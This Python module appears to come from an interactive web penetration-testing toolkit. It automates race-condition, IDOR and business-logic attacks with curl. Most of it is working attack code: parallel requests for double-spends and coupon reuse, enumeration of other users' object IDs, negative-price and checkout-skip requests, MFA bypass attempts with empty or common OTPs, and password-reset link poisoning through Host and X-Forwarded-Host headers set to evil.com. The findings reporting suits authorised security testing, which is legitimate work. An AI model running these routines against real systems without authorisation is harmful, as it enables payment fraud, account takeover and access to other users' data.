"""
modules/race_idor.py
Race Conditions, IDOR Automation & Business Logic Testing
Race window · last-write-wins · IDOR enumeration · price manipulation · workflow bypass
"""
import os
import re
import shlex
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.differential import Verdict, compare_access
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    ask_int,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)
from utils.http import ScopeViolation, get_client
from utils.identity import Identity, request_as


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def _curl_flags():
    flags = "-sk"
    c = SESSION.get("cookies", ""); p = SESSION.get("proxy", "")
    if c: flags += f" -b {shlex.quote(c)}"
    if p: flags += f" --proxy {shlex.quote(p)}"
    return flags


def _run(cmd, timeout=20):
    out, err, _ = run_cmd(cmd, timeout=timeout)
    return ((out or "") + ("\n" + err if err else "")).strip() or "(no output)"


# ── 1. Race Condition Testing ─────────────────────────────────────────────────

def race_conditions():
    section("RACE CONDITION TESTING")
    url = _target()
    cf  = _curl_flags()

    print(f"""
  {NEON_CYN}Race Condition Scenarios:{RST}
    [1] Coupon/promo code reuse (apply same code twice simultaneously)
    [2] Double-spend on balance/credit
    [3] Rate limit bypass (send many requests in tight window)
    [4] Registration uniqueness bypass (same username/email simultaneously)
    [5] File upload race (overwrite with payload during processing)
    [6] Custom endpoint race test
""")
    choice = prompt("Scenario [1-6]")

    if choice == "1":
        endpoint = prompt("Coupon endpoint (e.g. /api/apply-coupon)")
        code     = prompt("Coupon/promo code to test")
        threads  = ask_int("Parallel requests", 20, minimum=1, maximum=200)
        _race_request(url, endpoint, "POST",
                      payload=f'{{"coupon":"{code}"}}',
                      content_type="application/json",
                      threads=threads,
                      success_indicator=["applied", "discount", "success", "200"])

    elif choice == "2":
        endpoint = prompt("Transfer/purchase endpoint (e.g. /api/transfer)")
        payload  = prompt("Request body (JSON)") or '{"amount":100,"to":"attacker"}'
        threads  = ask_int("Parallel requests", 20, minimum=1, maximum=200)
        _race_request(url, endpoint, "POST", payload=payload,
                      content_type="application/json", threads=threads,
                      success_indicator=["success", "transferred", "balance"])

    elif choice == "3":
        endpoint = prompt("Rate-limited endpoint (e.g. /api/reset-password)")
        threads  = ask_int("Requests in race window", 50, minimum=1, maximum=500)
        results  = _race_request(url, endpoint, "GET", threads=threads,
                                  success_indicator=["200", "success"])
        two_hundreds = results.count("200")
        if two_hundreds > 1:
            warn(f"Rate limit bypass possible - {two_hundreds} successful responses!")
            add_vuln("Rate Limit Race Condition", "High", "A07:2021",
                     f"{two_hundreds} requests succeeded simultaneously at {url+endpoint}",
                     url + endpoint)

    elif choice == "4":
        endpoint = prompt("Registration endpoint (e.g. /api/register)")
        username = prompt("Username to register (simultaneously)")
        payload  = f'{{"username":"{username}","email":"{username}@test.com","password":"Test1234!"}}'
        threads  = ask_int("Parallel requests", 10, minimum=1, maximum=200)
        results  = _race_request(url, endpoint, "POST", payload=payload,
                                  content_type="application/json", threads=threads,
                                  success_indicator=["201", "created", "registered"])
        if results.count("success") > 1:
            success("RACE CONDITION - duplicate registration succeeded!")
            add_vuln("Race Condition - Duplicate Registration", "High", "A04:2021",
                     f"Username '{username}' registered multiple times simultaneously", url + endpoint)

    elif choice in ("5", "6"):
        endpoint = prompt("Target endpoint")
        method   = prompt("HTTP method [POST/GET]") or "POST"
        payload  = prompt("Request body (leave empty for GET)")
        ct       = prompt("Content-Type [application/json]") or "application/json"
        threads  = ask_int("Parallel requests", 20, minimum=1, maximum=200)
        _race_request(url, endpoint, method, payload=payload,
                      content_type=ct, threads=threads,
                      success_indicator=["200", "201", "success"])


def _race_request(url, endpoint, method, payload="", content_type="application/json",
                  threads=20, success_indicator=None):
    """Fire N simultaneous requests and report results."""
    cf = _curl_flags()
    full_url = shlex.quote(url.rstrip('/') + endpoint)

    if payload:
        cmd = (f"curl {cf} -s --max-time 8 "
               f"-X {method} "
               f"-H {shlex.quote(f'Content-Type: {content_type}')} "
               f"-d {shlex.quote(payload)} "
               f"-w '\\nHTTP:%{{http_code}}' "
               f"{full_url} 2>&1")
    else:
        cmd = (f"curl {cf} -s --max-time 8 "
               f"-X {method} "
               f"-w '\\nHTTP:%{{http_code}}' "
               f"{full_url} 2>&1")

    info(f"Firing {threads} simultaneous requests to {url+endpoint}...")
    results = []
    start = time.time()

    # Use a barrier to synchronize all threads
    barrier = threading.Barrier(threads)

    def _fire():
        barrier.wait()  # All threads start at exactly the same moment
        return _run(cmd, timeout=15)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(_fire) for _ in range(threads)]
        for fut in as_completed(futures):
            r = fut.result()
            code_m = re.search(r'HTTP:(\d+)', r)
            code   = code_m.group(1) if code_m else "?"
            results.append(code)

    elapsed = time.time() - start
    from collections import Counter
    codes = Counter(results)
    info(f"Completed in {elapsed:.2f}s - Response codes: {dict(codes)}")

    if success_indicator:
        hits = sum(1 for r in results if any(s in r for s in success_indicator))
        if hits > 1:
            success(f"RACE CONDITION - {hits}/{threads} requests succeeded simultaneously!")
            return "success" * hits
    return " ".join(results)


# ── 2. IDOR Automation ────────────────────────────────────────────────────────

def idor_scan():
    section("IDOR - INSECURE DIRECT OBJECT REFERENCE")
    url = _target()
    cf  = _curl_flags()

    print(f"""
  {NEON_CYN}IDOR Testing Strategy:{RST}
    1. Find object-referencing parameters (id, user_id, account, order, file)
    2. As user A, create/own a resource → note its ID
    3. As user B (or unauthenticated), access that resource via ID
    4. Vary: sequential IDs, GUIDs, hashed IDs, encoded IDs

  {NEON_CYN}[1]{RST} Sequential ID enumeration
  {NEON_CYN}[2]{RST} GUID/UUID endpoint testing
  {NEON_CYN}[3]{RST} Horizontal privilege escalation  {SOFT_WHITE}(replay as user A, user B and anonymous){RST}
  {NEON_CYN}[4]{RST} API object scan (batch ID test)
""")
    choice = prompt("Choice [1-4]")

    if choice == "1":
        _idor_sequential(url, cf)
    elif choice == "2":
        _idor_guid(url, cf)
    elif choice == "3":
        differential_idor(url)
    elif choice == "4":
        _idor_api_batch(url, cf)


def _idor_sequential(url, cf):
    """Test sequential integer IDs on an endpoint."""
    endpoint = prompt("Endpoint with ID (e.g. /api/users/1 or /profile?id=1)")
    own_id   = prompt("Your authorized resource ID")
    start_id = ask_int("Start ID to test", 1, minimum=0)
    end_id   = ask_int("End ID", 50, minimum=start_id)

    # Replace ID in endpoint
    def _make_url(id_val):
        if "/" + own_id in endpoint:
            return url.rstrip('/') + endpoint.replace("/" + own_id, f"/{id_val}")
        elif "=" + own_id in endpoint:
            return url.rstrip('/') + endpoint.replace("=" + own_id, f"={id_val}")
        else:
            return url.rstrip('/') + endpoint + f"/{id_val}"

    info(f"Testing IDs {start_id}-{end_id} in parallel...")

    baseline = _run(f"curl {cf} -s --max-time 6 {shlex.quote(_make_url(own_id))} 2>&1", timeout=10)
    base_len = len(baseline)

    def _test_id(id_val):
        test_url = _make_url(id_val)
        out = _run(f"curl {cf} -s -o /dev/null -w '%{{http_code}}:%{{size_download}}' "
                   f"--max-time 5 {shlex.quote(test_url)}", timeout=8)
        parts = out.strip().split(":")
        code = parts[0] if parts else "?"
        size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        return id_val, test_url, code, size

    found_idor = []
    with ThreadPoolExecutor(max_workers=15) as ex:
        futures = [ex.submit(_test_id, i) for i in range(start_id, end_id + 1)
                   if str(i) != own_id]
        for fut in as_completed(futures):
            id_val, test_url, code, size = fut.result()
            if code == "200" and size > 50 and abs(size - base_len) < base_len * 2:
                found_idor.append((id_val, test_url, code, size))
                print(f"  {NEON_YEL}[IDOR?]{RST} ID={id_val}  HTTP={code}  Size={size}  {test_url}")
            elif code == "200":
                print(f"  {DIM}[{code}]{RST}  ID={id_val}  (size={size})")
            else:
                print(f"  {DIM}[{code}]{RST}  ID={id_val}")

    if found_idor:
        success(f"IDOR: {len(found_idor)} accessible resource(s) found outside your ownership!")
        add_vuln("IDOR - Unauthorized Object Access", "High", "A01:2021",
                 f"Sequential ID enumeration revealed {len(found_idor)} accessible objects at {url+endpoint}",
                 url + endpoint)
    else:
        info("No obvious IDOR found - try manual verification or non-sequential IDs")


def _idor_guid(url, cf):
    """Test GUID/UUID-based endpoints."""
    endpoint = prompt("GUID-based endpoint (e.g. /api/documents/{guid})")
    own_guid = prompt("Your resource GUID")
    if not own_guid:
        return

    info("Testing GUID variations...")
    # Variations: uppercase, different segments, increment last octet
    variations = [
        own_guid.upper(),
        own_guid.lower(),
        own_guid[:8] + "-" + own_guid[9:],          # slight modification
        "00000000-0000-0000-0000-000000000001",       # sequential guess
        "ffffffff-ffff-ffff-ffff-ffffffffffff",       # max value
    ]

    for var in variations:
        test_ep = endpoint.replace(own_guid, var)
        test_url = url.rstrip('/') + test_ep
        code = _run(
            f"curl {cf} -o /dev/null -w '%{{http_code}}' --max-time 5 {shlex.quote(test_url)}", timeout=8
        ).strip()
        if code == "200":
            print(f"  {NEON_YEL}[200]{RST} {var} - accessible!")
        else:
            print(f"  {DIM}[{code}]{RST} {var}")


def _prompt_identity(name: str, hint: str) -> Identity:
    """Collect one user's credentials."""
    print(f"\n  {NEON_CYN}{name}{RST} - {SOFT_WHITE}{hint}{RST}")
    cookies = prompt(f"  {name} Cookie header (blank to skip)")
    token   = prompt(f"  {name} Authorization / bearer token (blank to skip)")
    return Identity(name=name, cookies=cookies.strip(), auth_token=token.strip())


def differential_idor(url: str):
    """Replay one request as the owner, a second user and nobody.

    The endpoint's own owner establishes what private data looks like. Only
    then does a second user's identical response mean anything - and an
    anonymous request that already returns the same content means the resource
    was never private and there is nothing to report.
    """
    section("DIFFERENTIAL ACCESS CONTROL (IDOR)")

    endpoint = prompt("Resource path belonging to user A (e.g. /api/orders/1001)")
    if not endpoint:
        return
    target_url = url.rstrip("/") + "/" + endpoint.lstrip("/")

    owner = _prompt_identity("User A", "the account that owns this resource")
    if owner.is_anonymous:
        warn("User A needs credentials - without them there is no owner view to "
             "compare against.")
        return
    attacker = _prompt_identity("User B", "a different account, same privilege level")
    if attacker.is_anonymous:
        warn("User B needs credentials of their own; comparing the owner against "
             "nobody only tests for missing authentication.")

    client = get_client()
    info(f"Requesting {target_url} as three identities...")

    responses = {}
    for identity in (owner, attacker, Identity.anonymous()):
        try:
            resp = request_as(client, identity, "GET", target_url, timeout=15)
        except (requests.RequestException, ScopeViolation) as exc:
            warn(f"{identity.name}: request failed ({exc})")
            resp = None
        responses[identity.name] = resp
        status = resp.status_code if resp is not None else "-"
        size = len(resp.text) if resp is not None else 0
        print(f"  {NEON_CYN}{identity.describe():<42}{RST} HTTP {status}  {size} bytes")

    # The operator named this path as user A's resource, so an anonymous caller
    # receiving it is missing authentication rather than a public page.
    verdict = compare_access(responses["User A"], responses["User B"],
                             responses["anonymous"], resource_is_private=True)

    print()
    if verdict.kind == Verdict.IDOR:
        success("IDOR CONFIRMED - user B reads user A's resource")
        add_vuln("IDOR - Horizontal Privilege Escalation", "High", "A01:2021",
                 f"{verdict.detail}\n\nRequested {target_url} as three identities: "
                 f"the owner and a second authenticated user received the same "
                 f"resource; an unauthenticated request did not.",
                 target_url, evidence=responses["User B"].evidence,
                 confidence="Confirmed", cwe="CWE-639",
                 remediation="Authorise on the object, not just the session: check "
                             "that the authenticated user owns the requested record "
                             "before returning it.")
    elif verdict.kind == Verdict.MISSING_AUTH:
        success("MISSING AUTHENTICATION - the resource is served to anyone")
        add_vuln("Missing Function Level Access Control", "Critical", "A01:2021",
                 f"{verdict.detail}\n\nRequested {target_url} with no credentials "
                 "and received the owner's data.",
                 target_url, evidence=responses["anonymous"].evidence,
                 confidence="Confirmed", cwe="CWE-306",
                 remediation="Require an authenticated session on this endpoint, then "
                             "authorise the specific object.")
    elif verdict.kind == Verdict.NOT_PRIVATE:
        info(f"No finding: {verdict.detail}")
    elif verdict.kind == Verdict.INCONCLUSIVE:
        warn(f"Inconclusive: {verdict.detail}")
    else:
        success(f"Access control holds: {verdict.detail}")

    return verdict


def _idor_horizontal(url, cf):
    """Kept for callers that still pass curl flags; delegates to the real test."""
    return differential_idor(url)


def _idor_api_batch(url, cf):
    """Batch API object test using GraphQL or REST bulk endpoint."""
    endpoint = prompt("API list endpoint (e.g. /api/users, /api/orders)")
    info("Fetching list to enumerate all accessible object IDs...")
    out = _run(f"curl {cf} -s --max-time 10 {shlex.quote(url.rstrip('/') + endpoint)}", timeout=15)
    ids = re.findall(r'"(?:id|_id|uuid|user_id|order_id)"\s*:\s*"?(\w+)"?', out)
    if ids:
        info(f"Found {len(ids)} object IDs: {ids[:10]}")
        info("Now test each ID - use Sequential IDOR test with these IDs")
        SESSION["agent_idor_ids"] = ids[:50]
    else:
        warn("No IDs found in response - endpoint may require auth or return paginated data")


# ── 3. Business Logic Testing ─────────────────────────────────────────────────

def business_logic():
    section("BUSINESS LOGIC VULNERABILITY TESTING")
    url = _target()
    cf  = _curl_flags()

    print(f"""
  {NEON_CYN}[1]{RST} Negative price / quantity     {SOFT_WHITE}(send -1 price or 0 quantity){RST}
  {NEON_CYN}[2]{RST} Currency & unit manipulation  {SOFT_WHITE}(send price in different currency){RST}
  {NEON_CYN}[3]{RST} Workflow step skipping        {SOFT_WHITE}(skip payment step in checkout){RST}
  {NEON_CYN}[4]{RST} Discount/coupon stacking      {SOFT_WHITE}(apply multiple discounts simultaneously){RST}
  {NEON_CYN}[5]{RST} 2FA / MFA bypass              {SOFT_WHITE}(skip OTP step, reuse tokens){RST}
  {NEON_CYN}[6]{RST} Password reset flow abuse     {SOFT_WHITE}(token reuse, predictable tokens, host header){RST}
  {NEON_CYN}[7]{RST} Account enumeration           {SOFT_WHITE}(timing attack, error message differences){RST}
""")
    choice = prompt("Choice [1-7]")

    if choice == "1":
        _negative_price(url, cf)
    elif choice == "2":
        _currency_manipulation(url, cf)
    elif choice == "3":
        _workflow_skip(url, cf)
    elif choice == "4":
        _coupon_stack(url, cf)
    elif choice == "5":
        _mfa_bypass(url, cf)
    elif choice == "6":
        _password_reset(url, cf)
    elif choice == "7":
        _account_enum(url, cf)


def _negative_price(url, cf):
    section("NEGATIVE PRICE / QUANTITY ATTACK")
    endpoint = prompt("Cart/order endpoint (e.g. /api/cart or /api/order)")
    params   = prompt("Item/quantity parameter format (e.g. item_id=123&quantity=1)")

    payloads = [
        params.replace("=1", "=-1"),
        params.replace("=1", "=0"),
        params.replace("=1", "=9999999"),
        params + "&price=-100",
        params + "&discount=100",
        params + "&quantity=0.001",
    ]

    info("Testing negative/zero/overflow quantity values...")
    for p in payloads:
        out = _run(
            f"curl {cf} -s --max-time 8 "
            f"-X POST "
            f"-H 'Content-Type: application/x-www-form-urlencoded' "
            f"-d {shlex.quote(p)} "
            f"{shlex.quote(url.rstrip('/') + endpoint)} 2>&1",
            timeout=12,
        )
        if any(x in out.lower() for x in ["success", "added", "total", "cart"]):
            warn(f"Accepted: {p}")
            if "-" in p or "0.001" in p:
                success("BUSINESS LOGIC BUG - negative/fractional value accepted!")
                add_vuln("Business Logic - Price/Quantity Manipulation", "High", "A04:2021",
                         f"Server accepted invalid value: {p}", url + endpoint)
        else:
            print(f"  {DIM}Rejected: {p[:60]}{RST}")


def _workflow_skip(url, cf):
    section("WORKFLOW STEP SKIPPING")
    print(f"""
  {NEON_CYN}Checkout workflow bypass technique:{RST}
    Typical e-commerce flow: Cart → Shipping → Payment → Confirm
    Attack: skip payment step by going directly to /confirm

  Test by navigating directly to the final step URL without completing payment.
""")
    final_ep = prompt("Final confirmation endpoint (e.g. /checkout/confirm, /order/complete)")
    out = _run(
        f"curl {cf} -s --max-time 10 {shlex.quote(url.rstrip('/') + final_ep)} 2>&1",
        timeout=15,
    )
    if any(x in out.lower() for x in ["order confirmed", "thank you", "success", "receipt"]):
        success("WORKFLOW BYPASS - Order confirmed without completing payment!")
        add_vuln("Business Logic - Checkout Bypass", "Critical", "A04:2021",
                 f"Payment step skippable at {url+final_ep}", url + final_ep)
    else:
        print(f"  Response: {out[:300]}")
        info("Manual verification needed - check for session state validation")


def _mfa_bypass(url, cf):
    section("2FA / MFA BYPASS")
    print(f"""
  {NEON_CYN}MFA Bypass Techniques:{RST}
""")
    endpoint = prompt("2FA verification endpoint (e.g. /api/verify-otp)")
    token_param = prompt("OTP parameter name [otp]") or "otp"

    bypass_attempts = [
        {token_param: ""},          # Empty token
        {token_param: "000000"},    # Common OTP
        {token_param: "123456"},
        {token_param: "111111"},
        {token_param: "999999"},
        {token_param: None},        # Missing param entirely
        {"skip_2fa": "true"},       # Hidden bypass param
        {"bypass": "1"},
    ]

    for attempt in bypass_attempts:
        if None in attempt.values():
            # Send without the OTP param
            data = "&".join(f"{k}={v}" for k, v in attempt.items() if v is not None)
        else:
            data = "&".join(f"{k}={v}" for k, v in attempt.items())

        out = _run(
            f"curl {cf} -s --max-time 8 "
            f"-X POST "
            f"-H 'Content-Type: application/x-www-form-urlencoded' "
            f"-d {shlex.quote(data)} "
            f"{shlex.quote(url.rstrip('/') + endpoint)} 2>&1",
            timeout=12,
        )
        if any(x in out.lower() for x in ["token", "logged in", "dashboard", "welcome", "success"]):
            success(f"MFA BYPASS with: {attempt}")
            add_vuln("2FA/MFA Bypass", "Critical", "A07:2021",
                     f"MFA bypassed with payload {attempt} at {url+endpoint}", url + endpoint)
        else:
            print(f"  {DIM}{attempt}: rejected{RST}")


def _password_reset(url, cf):
    section("PASSWORD RESET FLOW ABUSE")
    endpoint = prompt("Password reset request endpoint (e.g. /api/forgot-password)")
    email    = prompt("Test email address")

    # Test 1: Host header injection → poisoned reset link
    info("Test 1: Host header injection...")
    out = _run(
        f"curl {cf} -s --max-time 10 "
        f"-X POST "
        f"-H 'Host: evil.com' "
        f"-H 'Content-Type: application/json' "
        f"-d {shlex.quote('{\"email\":\"' + email + '\"}')} "
        f"{shlex.quote(url.rstrip('/') + endpoint)} 2>&1",
        timeout=15,
    )
    if "evil.com" in out:
        success("HOST HEADER INJECTION in reset link!")
        add_vuln("Password Reset - Host Header Injection", "High", "A07:2021",
                 "Reset link domain poisoned via Host header", url + endpoint)
    else:
        print(f"  {DIM}Host header injection: not reflected{RST}")

    # Test 2: X-Forwarded-Host
    info("Test 2: X-Forwarded-Host injection...")
    out2 = _run(
        f"curl {cf} -s --max-time 10 "
        f"-X POST "
        f"-H 'X-Forwarded-Host: evil.com' "
        f"-H 'Content-Type: application/json' "
        f"-d {shlex.quote('{\"email\":\"' + email + '\"}')} "
        f"{shlex.quote(url.rstrip('/') + endpoint)} 2>&1",
        timeout=15,
    )
    if "evil.com" in out2:
        success("X-FORWARDED-HOST INJECTION in reset link!")
        add_vuln("Password Reset - X-Forwarded-Host Injection", "High", "A07:2021",
                 "Reset link domain poisoned via X-Forwarded-Host", url + endpoint)

    # Test 3: Token leak in response
    info("Test 3: Check if reset token leaks in response...")
    if re.search(r'[a-f0-9]{32,}|[A-Za-z0-9\-_]{20,}', out or out2):
        warn("Reset token may be present in response body - check manually")


def _account_enum(url, cf):
    section("ACCOUNT ENUMERATION")
    login_ep = prompt("Login endpoint [/login]") or "/login"
    reset_ep = prompt("Password reset endpoint [/forgot-password]") or "/forgot-password"

    known_user  = prompt("Known valid username/email")
    fake_user   = f"nonexistent_user_{int(time.time())}@fake.example.com"

    info("Timing attack - measuring response time difference...")
    times = {}
    for user, label in [(known_user, "valid"), (fake_user, "invalid")]:
        t0 = time.time()
        _run(
            f"curl {cf} -s --max-time 8 -X POST "
            f"-d {shlex.quote(f'email={user}&password=wrongpassword')} "
            f"{shlex.quote(url.rstrip('/') + login_ep)} 2>&1",
            timeout=12,
        )
        times[label] = round(time.time() - t0, 3)

    info(f"Response times - valid: {times['valid']}s  invalid: {times['invalid']}s")
    diff = abs(times['valid'] - times['invalid'])
    if diff > 0.3:
        warn(f"Timing difference {diff:.3f}s - possible account enumeration via timing!")
        add_vuln("Account Enumeration via Timing", "Medium", "A07:2021",
                 f"Login response time differs by {diff:.3f}s for valid vs invalid accounts",
                 url + login_ep)

    # Error message difference
    info("Checking error message differences...")
    out_valid = _run(
        f"curl {cf} -s --max-time 8 -X POST "
        f"-d {shlex.quote(f'email={known_user}&password=wrongpassword')} "
        f"{shlex.quote(url.rstrip('/') + login_ep)} 2>&1", timeout=12,
    )
    out_invalid = _run(
        f"curl {cf} -s --max-time 8 -X POST "
        f"-d {shlex.quote(f'email={fake_user}&password=wrongpassword')} "
        f"{shlex.quote(url.rstrip('/') + login_ep)} 2>&1", timeout=12,
    )
    if out_valid != out_invalid:
        print(f"  Valid user:   {out_valid[:100]}")
        print(f"  Invalid user: {out_invalid[:100]}")
        warn("Different error messages - user enumeration possible!")
        add_vuln("Account Enumeration via Error Message", "Medium", "A07:2021",
                 "Different error messages for valid vs invalid accounts", url + login_ep)
    else:
        success("Same response for valid/invalid - enumeration harder")


def _currency_manipulation(url, cf):
    section("CURRENCY / UNIT MANIPULATION")
    endpoint = prompt("Checkout/payment endpoint")
    info("Testing currency code manipulation...")
    for currency in ["USD", "EUR", "XXX", "ZZZ", "BTC", "0", ""]:
        out = _run(
            f"curl {cf} -s --max-time 8 -X POST "
            f"-H 'Content-Type: application/json' "
            f"-d {shlex.quote('{\"amount\":100,\"currency\":\"' + currency + '\"}')} "
            f"{shlex.quote(url.rstrip('/') + endpoint)} 2>&1", timeout=12,
        )
        if "success" in out.lower() or "201" in out:
            warn(f"Accepted currency: '{currency}' - check if conversion applied correctly")
        else:
            print(f"  {DIM}Rejected currency: '{currency}'{RST}")


def _coupon_stack(url, cf):
    section("COUPON / DISCOUNT STACKING")
    endpoint = prompt("Coupon apply endpoint (e.g. /api/cart/coupon)")
    code1    = prompt("Coupon code 1")
    code2    = prompt("Coupon code 2 (same or different)")
    threads  = 10
    info(f"Applying {code1} and {code2} simultaneously in {threads} parallel requests...")
    _race_request(url, endpoint, "POST",
                  payload=f'{{"coupon":"{code1}"}}',
                  content_type="application/json",
                  threads=threads,
                  success_indicator=["applied", "discount", "success"])


# ── Menu ──────────────────────────────────────────────────────────────────────

def run():
    print_banner("RACE CONDITIONS · IDOR · BUSINESS LOGIC",
                 "Parallel attacks · Object enumeration · Workflow bypass · Auth abuse")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}── Race Conditions ──────────────────────────────────────────{RST}
  {NEON_CYN}[1]{RST} Race Condition Tests   {SOFT_WHITE}(coupon/credit/rate-limit/registration race){RST}

  {NEON_CYN}── IDOR ─────────────────────────────────────────────────────{RST}
  {NEON_CYN}[2]{RST} IDOR Automation        {SOFT_WHITE}(sequential IDs · GUID · horizontal privesc · API){RST}

  {NEON_CYN}── Business Logic ───────────────────────────────────────────{RST}
  {NEON_CYN}[3]{RST} Business Logic Tests   {SOFT_WHITE}(price · workflow · coupon · 2FA · reset · enum){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":    break
        elif c == "1":  race_conditions()
        elif c == "2":  idor_scan()
        elif c == "3":  business_logic()
        save_session()
